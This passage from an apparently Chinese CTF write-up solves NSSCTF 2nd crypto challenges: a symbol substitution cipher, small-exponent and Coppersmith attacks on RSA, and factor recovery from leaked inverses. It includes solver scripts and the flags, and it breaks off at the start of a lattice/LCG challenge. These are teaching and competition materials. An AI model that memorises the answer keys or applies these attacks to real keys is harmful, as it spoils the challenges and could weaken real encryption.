✧✬✸✯✬✮✯ ✣✬ ❂✢✡✮✰ ✵✬✳ ✣✴✯ ✧✳✮ ✦✮✱ ✰✡✲✯ ✵✬✳ ✦ ✰✬✬✱ ✤✯✯✶✡✮✰, ✣✴✯✮ ✵✬✳ ✸✦✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✦ ✶✬✮✰ ✣✡✸✯.</span><br><span class="line">✡✮ ✦ ★✬✢✱,✡ ✴✬✷✯ ✵✬✳ ★✡✶✶ ✶✡✥✯ ✩✢✵✷✣✬✰✢✦✷✴✵.✣✴✡✧ ✡✧ ✵✬✳✢ ✤✶✦✰:✮✧✧✩✣✤&#123;✩✢✵✷✣✬_✡✧_✧✬_✡✮✣✯✢✯✧✣✡✮✰_★✴✵_✱✬✮<span class="string">&#x27;✣_✵✬✳_✫✬✡✮_✳✧&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><ul><li>通过分析发现最后一行应该就是flag，并且可以知道这个就是单纯的替换，可以从以下猜测几个符号对应的字母：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag:NSSCTF&#123;&#125;</span><br><span class="line">✤✶✦✰:✮✧✧✩✣✤&#123;✩✢✵✷✣✬_✡✧_✧✬_✡✮✣✯✢✯✧✣✡✮✰_★✴✵_✱✬✮<span class="string">&#x27;✣_✵✬✳_✫✬✡✮_✳✧&#125;</span></span><br></pre></td></tr></table></figure><ul><li>首先找到一张英文字母频率表，统计密文符号出现的频率，从而得到符号与字母的映射。</li></ul><p><img src="/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/image-20251217225512795.png" alt="image-20251217225512795"></p><ul><li>exp如下：</li></ul><h2 id="ezrsa"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length()&lt;<span class="number">200</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">kbits = <span class="number">103</span></span><br><span class="line">m = (m &gt;&gt; kbits) &lt;&lt; kbits <span class="comment"># 遮盖低103位</span></span><br><span class="line">Mod = getPrime(<span class="number">1024</span>) <span class="comment"># 生成1024位素数</span></span><br><span class="line">hint1 = (<span class="number">2021</span>-<span class="number">2023</span>*m) % Mod <span class="comment"># 计算一个同余式,没模之前计算结果是负数,模之后是正数其实就是(Mod+2021-2023*m)</span></span><br><span class="line">hint2 = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">2023</span>, Mod) <span class="comment"># 计算2^2023 % Mod</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint1 =&#x27;</span>,hint1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint2 =&#x27;</span>,hint2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line"><span class="string">c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"><span class="string">hint1 = 153580531261794088318480897414037573794615852052189508424770502825730438732573547598712417272036492121110446656514226232815820756435437665617271385368704576530324067841094570337328191161458300549179813432377043779779861066187597784486306748688798924645894867137996446960685210314180286437706545416961668988800</span></span><br><span class="line"><span class="string">hint2 = 130939024886341321687705945538053996302793777331032277314813607352533647251650781154105954418698306293933779129141987945896277615656019480762879716136830059777341204876905094451068416223212748354774066124134473710638395595420261557771680485834288346221266495706392714094862310009374032975169649227238004805982</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul><li>明文<code>m</code>的位数还是比较小的，本题就是小指数加密，直接开方即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857</span></span><br><span class="line">c = <span class="number">5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077</span></span><br><span class="line"></span><br><span class="line">m = gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;Rea1_Si9n3n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><ul><li>本题还有一个Coppersmith的做法，该题的可以比较深入的理解Coppersmith攻击，首先我们先来看看两个提示：</li></ul><script type="math/tex; mode=display">\begin{array}{l}h_1\equiv(2021-2023*m)~mod(~r)\\h_2\equiv2^{2023}~mod(~r)\end{array}</script><ul><li>使用Coppersmith攻击的话需要两个必要的东西：其中一个就是方程，另一个是模数$N$，这个模数要满足$r|N$。根据$h_2$，我们可以得到模数$N$，如下所示：</li></ul><script type="math/tex; mode=display">2^{2023}-h_2\equiv 0~mod(~r)</script><ul><li>现在我们就需要通过$h_1$去构造方程，所构造的方程就可以得到如下所示的方程：</li></ul><script type="math/tex; mode=display">2023*m+h_1-2021\equiv0~mod(~r)</script><ul><li>接下来我们就可以构造如下的方程使用Coppersmith攻击去求得$m$：</li></ul><script type="math/tex; mode=display">2023*m+h_1-2021\equiv0~mod(~2^{2023}-h_2)</script><ul><li>接下来就是比较常见的低加密指数使用Coppersmith攻击求解明文<code>m</code>的低位，构造方程：</li></ul><script type="math/tex; mode=display">c-(m+x)^{3}\equiv 0~mod(~n)</script><ul><li>最后exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">hint1 = </span><br><span class="line">hint2 = </span><br><span class="line"></span><br><span class="line">kp = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">2023</span>) - hint2</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(kp))</span><br><span class="line">f = hint1 - <span class="number">2021</span> + <span class="number">2023</span> * x</span><br><span class="line">f = f.monic()</span><br><span class="line">result = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">m = <span class="number">1746716778150027565782467891299010283212636160</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">P.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g = c - (m+y)^<span class="number">3</span> </span><br><span class="line">g = g.monic()</span><br><span class="line">result2 = g.small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br><span class="line">flag = m+<span class="number">9770564320547953144707390074493</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[1746716778150027565782467891299010283212636160]</span></span><br><span class="line"><span class="string">b&#x27;NSSCTF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">[9770564320547953144707390074493]</span></span><br><span class="line"><span class="string">b&#x27;NSSCTF&#123;Rea1_Si9n3n&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">length = <span class="built_in">len</span>(flag)</span><br><span class="line">flag1 = flag[:length//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[length//<span class="number">2</span>:]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">p1 = gmpy2.invert(p,q)</span><br><span class="line">q1 = gmpy2.invert(q,p)</span><br><span class="line">c = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p1=&quot;</span>,p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q1=&quot;</span>,q1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;phi=&quot;</span>,phi)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p1= 3020925936342826638134751865559091272992166887636010673949262570355319420768006254977586056820075450411872960532347149926398408063119965574618417289548987</span></span><br><span class="line"><span class="string">q1= 4671408431692232396906683283409818749720996872112784059065890300436550189441120696235427299344866325968178729053396743472242000658751114391777274910146291</span></span><br><span class="line"><span class="string">c= 25112054943247897935419483097872905208058812866572413543619256987820739973912338143408907736140292730221716259826494247791605665059462509978370784276523708331832947651238752021415405546380682507724076832547566130498713598421615793975775973104012856974241202142929158494480919115138145558312814378701754511483</span></span><br><span class="line"><span class="string">phi= 57503658815924732796927268512359220093654065782651166474086873213897562591669139461637657743218269483127368502067086834142943722633173824328770582751298229218384634668803018140064093913557812104300156596305487698041934061627496715082394633864043543838906900101637618600513874001567624343801197495058260716932</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m2, e, n)</span><br><span class="line">hint = <span class="built_in">pow</span>(<span class="number">2023</span> * p + <span class="number">114514</span>, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>,hint)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n= 12775720506835890504634034278254395430943267336816473660983646973423280986156683988190224391394224069040565587173690009193979401332176772774003070053150665425296356891182224095151626957780349726980433545162004592720236315207871365869074491602494662741551613634958123374477023452496165047922053316939727488269523121920612595228860205356006298829652664878874947173274376497334009997867175453728857230796230189708744624237537460795795419731996104364946593492505600336294206922224497794285687308908233911851722675754289376914626682400586422368439122244417279745706732355332295177737063024381192630487607768783465981451061</span></span><br><span class="line"><span class="string">c= 11915755246503584850391275332434803210208427722294114071001100308626307947436200730224125480063437044802693983505018296915205479746420176594816835977233647903359581826758195341201097246092133133080060014734506394659931221663322724002898147351352947871411658624516142945817233952310735792476179959957816923241946083918670905682025431311942375276709386415064702578261223172000098847340935816693603778431506315238612938066215726795441606532661443096921685386088202968978123769780506210313106183173960388498229061590976260661410212374609180449458118176113016257713595435899800372393071369403114116302366178240855961673903</span></span><br><span class="line"><span class="string">hint= 3780943720055765163478806027243965253559007912583544143299490993337790800685861348603846579733509246734554644847248999634328337059584874553568080801619380770056010428956589779410205977076728450941189508972291059502282197067064652703679207594494311426932070873126291964667101759741689303119878339091991064473009603015444698156763131697516348762529243379294719509271792197450290763350043267150173332933064667716343268081089911389405010661267902446894363575630871542572200564687271311946580866369204751787686029541644463829030926902617740142434884740791338666415524172057644794094577876577760376741447161098006698524808</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="math第一部分"><a href="#Math第一部分" class="headerlink" title="Math第一部分"></a>Math第一部分</h3><ul><li>题目附件将flag分成了两份，分别进行了RSA加密，并且这两个次加密都会泄露出一些数据从而使得。首先来分析第一次加密泄露出的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据输出的数据就可以知道,phi已知现在其实就是要根据p1和q1求出n就可以将第一部分解密了</span></span><br><span class="line"><span class="comment"># 这里其实e和phi都知道,也就是说d也是已知的</span></span><br><span class="line">p1 = gmpy2.invert(p,q)</span><br><span class="line">q1 = gmpy2.invert(q,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p1=&quot;</span>,p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q1=&quot;</span>,q1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;phi=&quot;</span>,phi)</span><br></pre></td></tr></table></figure><ul><li><p>第一个方程：</p><ul><li>本题的解法其实就是构造方程，首先利用$k、d$构造方程：</li></ul><script type="math/tex; mode=display">\begin{array}{l}ed\equiv1~mod(\phi(n))\\ed-1\equiv0~mod(\phi(n))\\ed-1=k*\phi(n)\\k=\frac{ed-1}{\phi(n)}\end{array}</script><ul><li>所以我们可以构造一个关于$p、q$的一个方程：</li></ul><script type="math/tex; mode=display">ed-1=k*[p*q-(p+q)+1]</script></li><li><p>第二个方程：</p><ul><li>对于$p_1、q_1$来说满足如下式子：</li></ul><script type="math/tex; mode=display">p_1\equiv p^{-1}~mod(~q)\\q_1\equiv q^{-1}~mod(~p)\\</script><ul><li>由逆元的性质就有如下的结论：</li></ul><script type="math/tex; mode=display">\begin{array}{l}p_1p-1\equiv0~mod(~q)\\q_1q-1\equiv0~mod(~p)\end{array}</script><ul><li>将同余方程转换成等式：</li></ul><script type="math/tex; mode=display">\begin{array}{l}p_1p-1=w_1q\\q_1q-1=w_2p\end{array}</script><ul><li>将上面两个等式相乘可以得到一个式子：</li></ul><script type="math/tex; mode=display">(p_1q_1-w_1w_2)pq=p_1p+q_1q-1</script><ul><li>对于相乘得到的左边式子，存在一个条件$p_1<p,q_1<q$，并且通过等式可以得到$p_1q_1-w_1w_2>0$则通过放缩就有：</p,q_1<q$，并且通过等式可以得到$p_1q_1-w_1w_2></li></ul><script type="math/tex; mode=display">\begin{array}{l}0<(p_1q_1-w_1w_2)pq<2pq\\\Rightarrow 0<p_1q_1-w_1w_2<2\\\Rightarrow p_1q_1-w_1w_2=1\end{array}</script><ul><li>那么就可以得到另外的一个等式：</li></ul><script type="math/tex; mode=display">pq=p_1p+q_1q-1</script></li><li><p>联立两个方程求解即可：</p></li></ul><script type="math/tex; mode=display">\begin{align}ed-1=&k*[p*q-(p+q)+1]\\pq=&p_1p+q_1q-1\end{align}</script><ul><li>第一部分exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p1 = </span><br><span class="line">q1 = </span><br><span class="line">c = </span><br><span class="line">phi = </span><br><span class="line">e = </span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">y = e*d - <span class="number">1</span></span><br><span class="line">k = y//phi</span><br><span class="line">t = (e*d-<span class="number">1</span>)//k</span><br><span class="line">p,q = var(<span class="string">&quot;p q&quot;</span>)</span><br><span class="line">eq1 = p*q-(p+q)+<span class="number">1</span> == t</span><br><span class="line">eq2 = p1*p+q1*q-<span class="number">1</span> == p*q</span><br><span class="line">solve([eq1,eq2],p,q)</span><br><span class="line">p = <span class="number">8227949876362113267072144961846048393056849759669796156924553779939503433107338055396756296154009288972625791697380742839785942158298397801412484034859067</span></span><br><span class="line">q = <span class="number">6988819776494465902198750769464437883348561721022295748041612490557734149835801503912448144263306897001345088119505767812048846266490345642125677660981803</span></span><br><span class="line">n = p*q</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">b&#x27;NSSCTF&#123;e713afa4-fcd8-4&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="math第二部分"><a href="#Math第二部分" class="headerlink" title="Math第二部分"></a>Math第二部分</h3><ul><li>第二部分的泄露如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m2, e, n)</span><br><span class="line">hint = <span class="built_in">pow</span>(<span class="number">2023</span> * p + <span class="number">114514</span>, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>,hint)</span><br></pre></td></tr></table></figure><ul><li><p>接下来直接进行推导：</p><ul><li>首先我们从<code>hint</code>进行推导：</li></ul><script type="math/tex; mode=display">hint=(2023*p+114514)^{q}~mod(~n)</script><ul><li>已知$n=p*q$由同余的性质我们可以得到下面两条路，接下来两条路我们：</li></ul><script type="math/tex; mode=display">hint=(2023*p+114514)^{q}~mod(~q)\\hint=(2023*p+114514)^{q}~mod(~p)</script></li><li><p>首先们看看上面的这一条路：</p><ul><li>首先列出已知：</li></ul><script type="math/tex; mode=display">hint=(2023*p+114514)^{q}~mod(~q)</script><ul><li>由费马定理可以得到：</li></ul><script type="math/tex; mode=display">hint=(2023*p+114514)~mod(~q)</script><ul><li>可以得到关于q的同余关系：</li></ul><script type="math/tex; mode=display">hint-2023*p-114514=0~mod(~q)</script><ul><li>但是通过分析发现如果能得到左边，那么我们就可以使用gcd的方法分解n，而此时我们的p是未知的，所以这条路是走不通的。</li></ul></li><li><p>接下来看看下面的这一条路：</p><ul><li>首先列出已知：</li></ul><script type="math/tex; mode=display">hint=(2023*p+114514)^{q}~mod(~p)</script><ul><li>通过二项式定理展开，再利用同余的性质就有如下同余式：</li></ul><script type="math/tex; mode=display">\begin{array}{l}hint\equiv114514^{q}~mod(~p)\\\Rightarrow hint-114514^{q}\equiv0~mod(p)\end{array}</script><ul><li>但是此时我们是并不知道$q$，而这个是指数运算，我们就会想到费马小定理：</li></ul><script type="math/tex; mode=display">\begin{array}{l}114514\equiv114514^{p}~mod(p)\\\Rightarrow 114514^{q} \equiv 114514^{n}~mod(~p)\end{array}</script><ul><li>那么我们就可以通过代换得到下面这样一个只有模数<code>p</code>未知的式子：</li></ul><script type="math/tex; mode=display">hint-114514^{n}\equiv0~mod(p)</script><ul><li>这样就可以直接通过gcd分解n。</li></ul></li><li><p>该部分exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n= </span><br><span class="line">c= </span><br><span class="line">hint= </span><br><span class="line">p = gcd(hint-<span class="built_in">pow</span>(<span class="number">114514</span>,n,n),n)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag2 = long_to_bytes(m2)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;19f-a1a6-959449b4df5a&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="math完整exp"><a href="#Math完整exp" class="headerlink" title="Math完整exp"></a>Math完整exp</h3><ul><li>完整exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p1= </span><br><span class="line">q1= </span><br><span class="line">c= </span><br><span class="line">phi= </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">y = e*d - <span class="number">1</span></span><br><span class="line">k = y//phi</span><br><span class="line">t = (e*d-<span class="number">1</span>)//k</span><br><span class="line">p,q = var(<span class="string">&quot;p q&quot;</span>)</span><br><span class="line">eq1 = p*q-(p+q)+<span class="number">1</span> == t</span><br><span class="line">eq2 = p1*p+q1*q-<span class="number">1</span> == p*q</span><br><span class="line">solve([eq1,eq2],p,q)</span><br><span class="line">p = <span class="number">8227949876362113267072144961846048393056849759669796156924553779939503433107338055396756296154009288972625791697380742839785942158298397801412484034859067</span></span><br><span class="line">q = <span class="number">6988819776494465902198750769464437883348561721022295748041612490557734149835801503912448144263306897001345088119505767812048846266490345642125677660981803</span></span><br><span class="line">n = p*q</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag1 = long_to_bytes(m1)</span><br><span class="line"></span><br><span class="line">n= </span><br><span class="line">c= </span><br><span class="line">hint= </span><br><span class="line">p = gcd(hint-<span class="built_in">pow</span>(<span class="number">114514</span>,n,n),n)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag2 = long_to_bytes(m2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1+flag2)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b&#x27;NSSCTF&#123;e713afa4-fcd8-419f-a1a6-959449b4df5a&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="latticelcg"><a href="#LatticeLCG" class="headerlink" title="LatticeLCG"></a>LatticeLCG</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span 